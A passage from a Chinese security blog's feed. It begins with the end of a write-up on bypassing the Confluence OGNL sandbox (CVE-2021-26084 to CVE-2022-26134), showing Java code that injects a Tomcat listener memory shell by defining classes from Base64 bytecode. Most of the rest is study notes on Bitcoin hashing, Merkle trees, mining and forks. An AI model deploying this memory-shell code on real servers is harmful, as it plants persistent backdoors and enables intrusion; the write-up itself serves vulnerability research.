        <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Field</span> <span class="n">appctx</span> <span class="o">=</span><span class="n">servletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"context"</span><span class="o">);</span>
        <span class="n">appctx</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>

        <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">core</span><span class="o">.</span><span class="na">ApplicationContext</span> <span class="n">applicationContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">core</span><span class="o">.</span><span class="na">ApplicationContext</span><span class="o">)</span> <span class="n">appctx</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">servletContext</span><span class="o">);</span>
        <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Field</span> <span class="n">atx</span><span class="o">=</span> <span class="n">applicationContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"context"</span><span class="o">);</span>
        <span class="n">atx</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">core</span><span class="o">.</span><span class="na">StandardContext</span> <span class="n">standardContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">core</span><span class="o">.</span><span class="na">StandardContext</span><span class="o">)</span> <span class="n">atx</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">applicationContext</span><span class="o">);</span>
        <span class="n">standardContext</span><span class="o">.</span><span class="na">addApplicationEventListener</span><span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">newInstance</span><span class="o">());</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//分两次打进去：</span>
<span class="c1">//先注册ListenerShell</span>
<span class="n">theoyu</span><span class="o">=</span> <span class="kt">var</span> <span class="n">classBytes</span> <span class="o">=</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="s">"yv66vgAAA......"</span><span class="o">);</span>
        <span class="kt">var</span> <span class="n">loader</span> <span class="o">=</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getContextClassLoader</span><span class="o">();</span>
        <span class="kt">var</span> <span class="n">reflectUtilsClass</span> <span class="o">=</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"org.springframework.cglib.core.ReflectUtils"</span><span class="o">,</span><span class="kc">true</span><span class="o">,</span><span class="n">loader</span><span class="o">);</span>
        <span class="kt">var</span> <span class="n">defineClassMethod</span> <span class="o">=</span> <span class="n">reflectUtilsClass</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"defineClass"</span><span class="o">,</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"[B"</span><span class="o">),</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="kt">var</span> <span class="n">o</span> <span class="o">=</span>   <span class="n">defineClassMethod</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span><span class="s">"ListenerShell"</span><span class="o">,</span><span class="n">classBytes</span><span class="o">,</span><span class="n">loader</span><span class="o">);</span>
        <span class="n">o</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>

<span class="c1">//再打AddLisenter</span>
<span class="n">theoyu</span><span class="o">=</span> <span class="kt">var</span> <span class="n">classBytes</span> <span class="o">=</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="s">"yv66vgAAAD......"</span><span class="o">);</span>
        <span class="kt">var</span> <span class="n">loader</span> <span class="o">=</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getContextClassLoader</span><span class="o">();</span>
        <span class="kt">var</span> <span class="n">reflectUtilsClass</span> <span class="o">=</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"org.springframework.cglib.core.ReflectUtils"</span><span class="o">,</span><span class="kc">true</span><span class="o">,</span><span class="n">loader</span><span class="o">);</span>
        <span class="kt">var</span> <span class="n">defineClassMethod</span> <span class="o">=</span> <span class="n">reflectUtilsClass</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"defineClass"</span><span class="o">,</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"[B"</span><span class="o">),</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="kt">var</span> <span class="n">o</span> <span class="o">=</span>   <span class="n">defineClassMethod</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span><span class="s">"AddListener"</span><span class="o">,</span><span class="n">classBytes</span><span class="o">,</span><span class="n">loader</span><span class="o">);</span>
        <span class="n">o</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
</code></pre></div></div>

<p>上面只是单纯的回显shell，修改一下就可以做哥斯拉或者冰蝎的内存木马，这里不演示了。</p>]]></content><author><name>Theoyu</name></author><category term="codeAudit" /><category term="VUL-Reproduce" /><category term="JAVA" /><summary type="html"><![CDATA[FROM CVE-2021-26084 TO CVE-2022-26134 ,Bypass Sandbox And Inject Memory Shell]]></summary></entry><entry><title type="html">SmartBi V10.5 Pre-Auth RCE</title><link href="https://theoyu.top/2022/codeaudit/SmartBi-V10.5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1" rel="alternate" type="text/html" title="SmartBi V10.5 Pre-Auth RCE" /><published>2022-06-06T00:00:00+08:00</published><updated>2022-06-06T00:00:00+08:00</updated><id>https://theoyu.top/2022/codeaudit/SmartBi%20V10.5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1</id><content type="html" xml:base="https://theoyu.top/2022/codeaudit/SmartBi-V10.5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><![CDATA[<p>🐶</p>]]></content><author><name>Theoyu</name></author><category term="codeAudit" /><category term="VUL-Reproduce" /><summary type="html"><![CDATA[🐶]]></summary></entry><entry><title type="html">『区块链技术与应用』学习笔记</title><link href="https://theoyu.top/2022/cource/BitCoin" rel="alternate" type="text/html" title="『区块链技术与应用』学习笔记" /><published>2022-05-13T00:00:00+08:00</published><updated>2022-05-13T00:00:00+08:00</updated><id>https://theoyu.top/2022/cource/BitCoin</id><content type="html" xml:base="https://theoyu.top/2022/cource/BitCoin"><![CDATA[<!--more-->

<h1 id="比特币">比特币</h1>

<h2 id="比特币中的密码学">比特币中的密码学</h2>

<h3 id="哈希">哈希</h3>

<p>hash的性质：</p>

<ol>
  <li><strong>collision resistance</strong>：哈希碰撞不是不会发生，是指很难以人为的方式去构造。</li>
  <li><strong>hiding</strong>：哈希函数的计算过程是单向、不可逆的。</li>
  <li><strong>puzzle friendly</strong>：hash计算的结果无法预测。</li>
</ol>

<p>比特币中用到的哈希函数是 SHA-256（Secure Hash Algorithm）。</p>

<h3 id="签名">签名</h3>

<p>去中心化的比特币系统中，由于没有第三方，所以需要『 签名 』明确交易的账户。</p>

<p>数字签名采用私钥进行签名，公布的公钥进行验证。</p>

<h2 id="比特币中的数据结构">比特币中的数据结构</h2>

<h3 id="hash-pointer哈希指针">Hash pointer（哈希指针）</h3>

<p>区块链结构本身是一条链表，节点为区块，链表通过指针指向的地址把节点所串连起来，在区块链中使用的哈希指针除了前一区块的地址，还包含前一区块的哈希。</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
    <span class="n">genesis</span> <span class="n">block</span>        <span class="n">A</span>             <span class="n">B</span>       <span class="n">most</span> <span class="n">recent</span> <span class="n">block</span>
    <span class="err">┌──────────┐</span>   <span class="err">┌──────────┐</span>   <span class="err">┌──────────┐</span>   <span class="err">┌──────────┐</span>
    <span class="err">│</span>          <span class="err">│</span>   <span class="err">│</span> <span class="n">H</span><span class="p">()</span>      <span class="err">│</span>   <span class="err">│</span> <span class="n">H</span><span class="p">()</span>      <span class="err">│</span>   <span class="err">│</span> <span class="n">H</span><span class="p">()</span>      <span class="err">│</span>
    <span class="err">│</span>          <span class="err">│◄──┤</span>          <span class="err">│◄──┤</span>          <span class="err">│◄──┤</span>          <span class="err">│</span>
    <span class="err">│</span>          <span class="err">│</span>   <span class="err">│</span>          <span class="err">│</span>   <span class="err">│</span>          <span class="err">│</span>   <span class="err">│</span>          <span class="err">│</span>
    <span class="err">└──────────┘</span>   <span class="err">└──────────┘</span>   <span class="err">└──────────┘</span>   <span class="err">└──────────┘</span>

</code></pre></div></div>

<p>如上图，每个区块都存有一个哈希值，哈希值的计算包括上一个区块内容本身+上一个区块的哈希，从而保证了内容不被篡改（<strong>tamper- evident log</strong>）。</p>

<p>比如如果破坏A的区块，则B存放的哈希值需要修改，最新的区块哈希值会计算B的哈希，从而也会修改，所以只要记住最后一个区块的地址，即可检测链上内容是否被篡改。</p>

<h3 id="merkle-tree-默克尔树">Merkle tree （默克尔树）</h3>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220611171217.png" alt="image-20220611145500812" /></p>

<p>如图下方是数据块，上方是节点，默克尔树和二叉树的区别在于前者使用哈希指针代替普通指针，比如AB数据块的父节点就存有其二者的哈希，其父节点同理，所以只需要记住根哈希，便可以检测出对树中任何部位的修改。</p>

<p>对于区块链来说，不同区块通过哈希指针连接，每一个区块分为块头和块身，块身中存放交易列表，而由这个区块包含的交易，所组成的默克尔树的根哈希，就存放在块头中。</p>

<p>Merkle tree的具体用途：</p>

<p>比特币系统中，节点分为轻节点和全节点，轻节点只保存块头信息，而全节点保存区块所有内容。因为一个区块比较大，对硬件要求会比较高，比如像手机钱包，就会采用轻节点的方式存储。</p>

<p>当对一个轻节点证明某条交易（tx，<strong>transaction</strong>）是否被写入区块链时，便会用到 Merkle proof。我们把交易到到根节点这一条路径叫做Merkle proof ，如下图，当轻节点确认黄色交易是否属实时，会向全节点请求需要的哈希（下图红色哈希），然后自底向上进行计算，把得到的最终结果和根哈希进行比对，进而进行判断。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/06/20220611171035.png" alt="image-20220611155011261" /></p>

<p>那这样是否是安全的呢？如果待验证交易是虚假的，是否可以再伪造一个红色哈希，来满足验证的需求，我们从哈希的三个性质来看，显然是不成立的。</p>

<p>Merkel proof 可以证明 Merkel tree中是否包含某个交易，所以这种证明又称为 <strong>proof of membership</strong> 或 <strong>proof of inclusion</strong>。 对于一个轻节点来说，验证一个 Merkel proof 的时间复杂度是多少呢？如果底层一共有 n 个交易，则时间复杂度为 $\theta(log(n)) $。</p>

<p>如何证明  Merkel tree 中不包含某个交易呢？即 <strong>proof of non- membership</strong>。可以把整颗树传给轻节点，轻节点收到后验证书的构造是对的，每一层用到的哈希值都是正确的，说明树中只有这些叶节点，如果不在这里面，则证明proof of non- membership。这样的时间复杂度为 $\theta (n)$ 。不过比特币中不需要不存在证明。</p>

<h2 id="比特币中的协议">比特币中的协议</h2>

<h3 id="交易transaction-based-ledger">交易（transaction based ledger）</h3>

<p>说比特币之前，我们先看一下中心化的数字货币是怎么进行交易的。</p>

<p>比如央行发行数字货币，央行用私钥对数字货币进行签名，人民群众用央行的公钥进行验证，从而对数字货币的真伪进行判断。</p>

<p>如果说某人有100的数字货币，他可以对这100的数字货币进行复制，这样相当于可以支付两次，也就造成了双花攻击（<strong>double spending attack</strong>）。</p>

<p>要想预防这种攻击，就需要央行给每个数字货币一个编号，再维护一个数据库。数据库中存有货币的编号及其所属人。当一个人想要进行交易时，需要从数据库中确认货币是否真实以及是否所属于他，都满足后数据库中货币的编号将指向收款人。</p>

<p>但是这样，每次交易太过于依赖一个中心化的机构，这时去中心化的比特币出现了。</p>

<p>比特币，同样也需要解决以下两个问题：</p>

<ol>
  <li>谁有权利发行货币，发行多少，什么时候发行？</li>
  <li>交易如何验证身份？如何防范双花攻击？</li>
</ol>

<p>第一个问题的答案是挖矿，这个部分后面会进行学习。第二个问题，我们通过以下的具体例子进行解决：</p>

<p><img src="../../assets/images/image-20220611220508617.png" alt="image-20220611220508617" /></p>

<p>图中，A具有铸币权，发布了10个比特币，第一个区块内的交易也称为铸币交易。同时A转账给B 5个比特币 C 5个比特币，A对该交易进行签名，同时该交易需要说明花掉这10个比特币的来源 —&gt; 铸币中产生的10个币，之后以此类推。</p>

<p>可以看到图中有两类哈希指针（不算块内的交易箭头），一类是指向前一个区块用于形成链，第二类是说明交易比特币的来源（红色➡️），可以防止双花攻击。</p>

<p>通过上述实例，我们可以总结比特币采用的是『 交易追溯 』的方法检验是否满足交易条件。</p>

<p>我们管『 记录账户模式 』的方法叫做 <strong>account-based ledger</strong>，现实世界以及以太坊，使用的就是这种模式；『 追溯交易模式 』的方法称为 <strong>transaction-based ledger</strong>。</p>

<p>那么交易的过程，到底需要哪些信息呢？</p>

<ol>
  <li>
    <p>从A  —&gt; B  的转账中，A 需要知道  B 的信息：</p>

    <blockquote>
      <p>A 毫无疑问只需要知道 B 的地址就可以了，这个地址由 B 公开的公钥进行二次哈希得到。</p>
    </blockquote>
  </li>
  <li>
    <p>从A  —&gt; B  的转账中，B 需要知道 A 的信息：</p>

    <blockquote>
      <p>B 需要知道 A的公钥，不仅是B所有节点都需要知道A的公钥用于验证A的签名。</p>
    </blockquote>
  </li>
</ol>

<p>这个公钥怎么得到呢？在A交易时，他需要提供出来，同时还需要提供货币来源，这样会不会有安全问题呢？</p>

<p>如果有一个B’冒充A，用自己的私钥进行签名，同时在交易时制定自己的公钥和A的货币来源，那么这样在签名验证肯定是没有问题的，但这无法伪造A的交易。因为追溯货币来源时，会得到A的地址（A的公钥哈希），只需把B所提供的公钥进行哈希之后比对，即可确认是不是存在身份伪造。</p>

<p>在上面的演示中每个区块都只有一个交易，但是实际上一个区块存在多个交易，这些交易也就组织成了 Merkel tree。</p>

<h3 id="挖矿求解">挖矿求解</h3>

<p>我们一直说挖矿，那挖矿到底是什么？挖矿简单来说就是根据算力，不断去尝试求解一个问题，我们先看看一个 <strong>block Header</strong> 的组成：</p>

<ol>
  <li>
    <p>version</p>
  </li>
  <li>
    <p>Hash of previous block header （指向前一个区块指针）</p>
  </li>
  <li>
    <p>merkle  root hash（默克尔树根哈希值）</p>
  </li>
  <li>
    <p>更新时间</p>
  </li>
  <li>
    <p>target（挖矿难度）</p>
  </li>
  <li>
    <p>nonce （一个随机数）</p>
  </li>
</ol>

<p>以上的内容，1-5是固定的，唯一变化的是6，把以上内容首位连接起来，得到一个字符串，对该字符串做两次SHA-256运算，得到256位的B，挖矿，就是不断的随机尝试nonce，直到B ≤ target，通俗一点就是B的前n位为0。</p>

<p>挖矿的具体细节和难度调整会在后面学习到。</p>

<h3 id="分布式共识">分布式共识</h3>

<p>分布式共识是什么？如果说系统中有很多台机器，共同维护一个全局的哈希表，那么这里的共识指的就是哈希表中包含了哪些键值对，假如机器 A中插入了一个键值对，那么要求其他机器也能够读出来。</p>

<blockquote>
  <p>分布式系统有很多结论，这里不展开介绍；</p>

  <p>FLP ( 三个专家名字的缩写 )不可能结论：在一个异步的 ( asynchronous ) 系统里，网络时延无上限，即使只有一个成员是有问题的 ( faulty ) ，也不可能达成共识。</p>

  <p>CAP Theorem ：任何一个分布式系统，Consistency ( 系统一致性 )、Availability ( 可用性 )、Partition tolerance ( 容错性 ) 只能最多满足其中两个性质 。</p>
</blockquote>

<p>那区块链中，需要满足怎样的共识呢？答案就是区块的共识，每个全节点都在本地维护了一个区块，这个区块包含了多个交易，那么哪些交易被写进区块，按什么顺序写入，这需要达到一个统一。这么多全节点，那么由哪一个被写入真正的区块链，作为大家所公认的，拥有记账权，这就是共识的问题。</p>

<p>在很多分布式系统中，都采用投票的机制以达到某个共识，但这才区块链中是否可行呢？</p>

<p>如果说这个链对加入的成员有所要求，比如联盟链，那么基于投票是可行的。问题在于区块链创建账号的成本几乎没有，只需要本地产生公私钥对即可，任何人都可以加入，如果黑客专门产生大量的公私钥对，当其超过系统的一半时，就可以获得支配地位，也就是女巫攻击（sybil attack ）。</p>

<p>那么区块链是怎么做到呢？区块链采用的是 POW  （proof of works ）机制，具体运作如下：</p>

<blockquote>
  <p>step1：全网广播新的数据记录 ，通过基本合法性验证的数据被暂存。这点是说，所有候选区块都是合法区块，非法区块（非法意思是区块中包含的交易不合法）是不会作为候选区块的。</p>

  <p>step2：全网执行共识算法，即找到合适的nonce，使得H(Block header)≤target，俗称挖矿</p>

  <p>step3：率先找到nonce节点获得记账权，其打包的区块可上传至区块链中</p>

  <p>step4：对外广播新区块，其他节点验证通过后，将其加至主链中。</p>
</blockquote>

<p>首先确定一点，为什么大家都想打包区块，争夺所谓的记账权呢？挖矿，自然是为了挖矿的奖励：</p>

<p>一个获得合法区块的节点，可以在区块中获得一个铸币交易 ，也就是出块奖励，实际上这种方式也是唯一一个产生新比特币的途径。</p>

<p>比特币系统规定，起初每个打包成功的区块可以获得50个比特币，之后每过 21万个区块，奖励减半，通过计算我们知道比特币一共有2100万个。</p>

<p>原来区块链是通过算力来进行投票，大家争夺的并不是记账权，而是挖矿后的奖励，记账只是在区块链中默认履行的义务。</p>

<p>下面我们再看看在共识中可能出现的几种特殊情况。</p>

<p><img src="../../assets/images/image-20220612214104372.png" alt="	" /></p>

<p>上图中，A在第5个区块发布之后，发布了第4’区块，并尝试上传到区块链中，这种情况是否可行？</p>

<p>首先，区块链遵循最长链原则，1-4’ 这条链虽然合法，但不是最长的，对于现在正准备挖矿打包的其他节点而言，他们的父哈希（Hash of previous block header ）已经指向了第五个区块，也就决定了之后的候选区块必然是连在5号区块之后的。</p>

<p>那么这种攻击 ( 分叉攻击 ) 有可能成立吗？如果A在上传4’后，马上又计算好了5’区块，然后计算好了6’区块，之后A同时上传，如果整个区块链网络还没能算好第六个区块，他们就会放弃计算6号区块，转而去计算7’，这就是分叉攻击，4号和5号的所有合法交易都被回滚。</p>

<p><img src="../../assets/images/image-20220612215231599.png" alt="image-20220612215231599" /></p>

<p>理论上是可行的，实际上A所对抗的算力是整个区块链网络的其他所有计算机，所以只有A达到整个系统的 51% 算力，才可能实现。</p>

<p>还有一种情况是自然分叉：</p>

<p><img src="../../assets/images/image-20220612215845702.png" alt="image-20220612215845702" /></p>

<p>两个符合要求的矿工，同时计算到了nonce并广播，在区块链网络中，有一部分人会接受上面的区块，一部分会接受下面的，分别用上面区块的哈希值作为父哈希进行计算，随着时间推移，总有一条链胜出（他的子节点先挖到矿并打包），成为最长合法链，由此保证了区块链的一致性，而被抛弃的区块称为 orphan block （孤儿区块，没有大爹算出来，是这样的），其中的交易就被全部回滚了。</p>

<h2 id="比特币系统的实现">比特币系统的实现</h2>

<p>上一节我们说到比特币采用交易模式是transaction-based ledger，因为系统中并没有显示记录每个账户的比特币数目，需要通过交易回溯推算。因此，在比特币系统中维护了一个 <strong>UTXO(Unspent Transaction Output)</strong>:尚未被花掉的交易。</p>

<p>后面的内容比较简单，介绍了一些具体的区块信息和交易信息，安全性分析也都是共识中谈过的内容，就不记录了。</p>

<h2 id="比特币网络">比特币网络</h2>

<p>在网络中需要传播两种信息：新发布交易的信息和新发布区块的信息。</p>

<p>比特币工作于应用层，其网络层为一个P2P overlay network。比特币系统中所有节点完全平等，要想加入网络，至少需要知道一个种子节点，通过种子节点告知他所知道的其他节点。当节点离开时，只需自行退出，其他节点一定时间没有收到该节点信息便会自行删除。</p>

<p>比特币网络设计原则：<strong>simple、robust、but not efficient</strong>。每个节点维护一个邻节点集合，消息传播在网络中采用flood 模式，某个节点在收到一条消息会将其发送给所有邻居节点并标记，下次再收到便不会再发送该消息，以免消息无限循环。邻居节点选取随机，未考虑网络底层拓扑结构，也与现实世界物理地址无关。该网络具有极强鲁棒性，但牺牲了网络效率。</p>

<p>如果有两个冲突交易 A-&gt;B 和 A-&gt;C（花费同一笔钱），取决于节点先收到哪个交易，宁外一个将抛弃。</p>

<h2 id="比特币的挖矿难度调整和历史">比特币的挖矿难度调整和历史</h2>

<p>在比特币系统中，平均出块时间保持到10min 左右，随着挖矿的人增多以及设备的强大，系统总算力不断增强，要想保持出块时间就得对挖矿的难度做出调整。</p>

<h3 id="挖矿难度调整">挖矿难度调整</h3>

<p>之前说到挖矿就是不断尝试 block header 中的 nonce 值，使得整个 block header 对两次哈希值小于 target ，那么调整挖矿难度，其实就是调整 target 。</p>

<p>对于挖矿难度，有以下几个问题：</p>

<ol>
  <li>
    <p>如果不调整挖矿难度会怎么样？</p>

    <blockquote>
      <p>随着系统算力的增强，挖矿难度不变，出块时间会越来越短。</p>
    </blockquote>
  </li>
  <li>
    <p>出块时间越来越短是好事吗？</p>

    <blockquote>
      <p>出块时间短的好处是交易很快能被写入区块链，提高了区块链的效率。但是问题是区块链网络传播有时延，如果出块时间短会使得系统中的节点经常处于不一致的状态，增加了系统的不稳定性，这种不稳定性会导致区块分叉状态过多，不利于达到共识，造成算力分散，黑客如果集中攻击的成本会大大降低。</p>
    </blockquote>
  </li>
</ol>

<h3 id="挖矿历史">挖矿历史</h3>

<p>列一下全节点和轻节点的区别：</p>

<table>
  <thead>
    <tr>
      <th style="text-align: center">全节点</th>
      <th style="text-align: center">轻节点</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">一直在线</td>
      <td style="text-align: center">不是一直在线</td>
    </tr>
    <tr>
      <td style="text-align: center">在本地硬盘上维护完整区块链信息</td>
      <td style="text-align: center">不保存整个区块链，只需要保存每隔区块块头</td>
    </tr>
    <tr>
      <td style="text-align: center">在内存中维护UTXO集合，以便于快速检验交易合法性</td>
      <td style="text-align: center">不保存全部交易，只保存和自己有关的交易</td>
    </tr>
    <tr>
      <td style="text-align: center">监听比特币网络中交易内容，验证每个交易合法性</td>
      <td style="text-align: center">无法验证大多数交易合法性，只能检验和自己相关的交易合法性</td>
    </tr>
    <tr>
      <td style="text-align: center">决定哪些交易会打包到区块中</td>
      <td style="text-align: center">无法检测网上发布的区块正确性</td>
    </tr>
    <tr>
      <td style="text-align: center">监听其他矿工挖出的区块，验证其合法性</td>
      <td style="text-align: center">可以验证挖矿难度</td>
    </tr>
    <tr>
      <td style="text-align: center">挖矿：<br />1 . 决定沿着哪条链挖下去。<br />2. 当出现等长分叉，选择哪一个分叉</td>
      <td style="text-align: center">只能检测哪个是最长链，不知道哪个是最长合法链</td>
    </tr>
  </tbody>
</table>

<p>目前挖矿越来越趋近于专业化，总体分为三个阶段，从通用演变为专用：</p>

<ol>
  <li>
    <p>CPU阶段</p>

    <blockquote>
      <p>早期，很多人使用自己的个人电脑挖矿，但挖矿过程中大多数的内存，硬盘以及CPU的大部分组件（因为挖矿求解本身运用到的指令就很少）都是闲置状态，随着挖矿难度的提高，用CPU挖矿根本不划算。</p>
    </blockquote>
  </li>
  <li>
    <p>GPU阶段</p>

    <blockquote>
      <p>GPU主要用作大规模并行计算，如深度学习，但GPU挖矿还是有一定的浪费，比如挖矿只使用整数，浮点数运算的部件将会闲置。</p>
    </blockquote>
  </li>
  <li>
    <p>ASIC芯片（<strong>Application Specific Integrated Circuit</strong>）阶段</p>

    <blockquote>
      <p>这种芯片相当于针对一类挖矿的求解问题（mining puzzle）进行针对性设计。</p>
    </blockquote>
  </li>
</ol>

<p><strong>ASIC芯片的出现是好事吗？</strong></p>

<blockquote>
  <p>ASIC芯片不是每个人都能参与进来，一定程度上提高了挖矿的门槛，这与去中心化相违背。并且ASIC的定制开发需要很长的周期（大于一年），如果这个时间内对应币的价值大幅度贬值价格跳水，投入的成本将血本无归。</p>

  <p>理想状态下，所有人应该都可以用家用计算机 CPU 进行挖矿，后续一些货币就考虑了这个问题，设计了对抗 ASIC 芯片化的解决方案，后续的以太坊就会介绍到。</p>
</blockquote>

<p>对于单个的矿工而言，即使使用了ASIC芯片，其算力在整个系统中仍然是很小的一部分，并且他还需要担任全节点的其他责任，造成了算力的浪费。</p>

<p>因此，后面变形成了矿池的概念：</p>

<p><img src="../../assets/images/image-20220618201028144.png" alt="image-20220618201028144" /></p>

<p>一个简单的矿池如上：一个全节点驱动多台矿机。矿工只需要不断的计算哈希即可，其他全节点的责任由矿主承担，当获得收益后，对所有矿工进行分配。</p>

<p>矿池一般有两种组织形式，一是同一机构对大规模数据中心统一挖矿，二是分布式，矿主和矿工不认识，矿工自愿加入矿池，矿主分配任务，但这一种情况的话利益的分配就成了一个问题：</p>

<ol>
  <li>
    <p>平均分配，所有人平分出块奖励</p>

    <blockquote>
      <p>这样肯定不行，首先不同矿工的算力有所差距，而且这种 『 吃大锅饭 』的方式肯定会让有一些矿工偷懒，所以需要按劳分配，要有一个工作量证明的制度。</p>
    </blockquote>
  </li>
  <li>
    <p>按劳计算，根据工作量分配</p>

    <blockquote>
      <p>假设原本的挖矿难度是计算所得前70位为0，现在降低要求只需前60位，这样挖矿更加容易，当然这个哈希本身是没有用的，并不满足挖矿的条件，我们把其称为一个 <strong>share</strong> ，或者 <strong>almost valid share</strong>，矿工没挖到一个share，便提交给矿主，作为其工作量的证明，等某个矿工真正挖到符合条件的区块后，再根据矿工所提交的的share所分配。</p>
    </blockquote>
  </li>
</ol>

<p>注意，每个矿工挖矿都是 <strong>随机的</strong> 生成nonce并尝试，不会说我从1-10000这个区间尝试，你从10001到20000这样，所有人都是随机的，尽管可能会重合（概率也很低）。</p>

<p>同时，一下几种情况也需要考虑：</p>

<ol>
  <li>
    <p>会不会存在有矿工平时正常挖矿交share，但是挖到真正的矿不是交给矿主而是自己偷偷发布出去（私吞）</p>

    <blockquote>
      <p>这种情况不可能，矿主组装区块交给矿工计算，其中铸币交易的收款地址是矿主，如果矿工修改改地址，其nonce也会失去其意义。</p>
    </blockquote>
  </li>
  <li>
    <p>会不会有矿工捣乱，平时提交share，挖到区块反而扔掉不提交。</p>

    <blockquote>
      <p>这种情况是有可能的，如果矿工本身想捣乱，可以这么做，虽然对他自身来说没有任何获利，损人不利己。</p>

      <p>但是矿池直接是存在竞争关系的，为了打击竞争对手可能排矿机加入对方矿池挖矿，只参与其他矿工挖矿分红，自己挖到的区块却丢掉不给他人分。</p>
    </blockquote>
  </li>
</ol>

<p>随着矿池的出现，算力也变得集中起来，在2014年曾有一个名叫 『 GHash 』的矿池达到了高达 51%的算力：</p>

<p><img src="../../assets/images/image-20220619003824934.png" alt="image-20220619003824934" /></p>

<p>我们之前说到如果算力达到51%就有可能可以发起分叉攻击，如果攻击者不喜欢某个账户A，在监听到A将交易发布到区块链后，立马发动分叉攻击使A无法成为最长合法链，这样便实现对对A的封锁（<strong>Boycott</strong>）。</p>

<p>可见矿池的出现威胁了区块链去中心化的特性，之后 GHash 主动降低了矿池算力，避免动摇人们对比特币的信心。</p>

<p>如果矿池表面上是安全的，实际上某个机构拥有超过百分之50的算力，不将其放入一个矿池中而是分散隐蔽，还是可以发动51%算力的攻击。</p>

<h2 id="比特币分叉">比特币分叉</h2>

<p>分叉是指原来比特币系统中的一条链变成了两条链。造成分叉的原因有很多，简单来说有以下三种：</p>

<ol>
  <li>state fork：两个时间差不多的矿工同时出矿，发布区块对比特币系统当前状态产生分歧的分叉。</li>
  <li>forking attack：人为分叉攻击造成的分叉。</li>
  <li>protocal fork：比特币协议改变，在分布式系统中不是所有的节点都进行升级，导致分叉。</li>
</ol>

<p>而这一节所说的分叉,主要就是围绕 protocal fork 所展开的，比特币协议改变，简单来说就是进行了更新。</p>

<p>回想一下我们现实软件中更新的例子，有的软件会在打开时提示你是否进行更新，你可以根据产品变更自行选择；有的软件会在下载时就默认确认自动更新，在连网的情况下自动获取数据包；有的软件在你选择是否更新后（否）自动退出，默认不进行更新则无法继续使用，这都是非常常见的例子。</p>

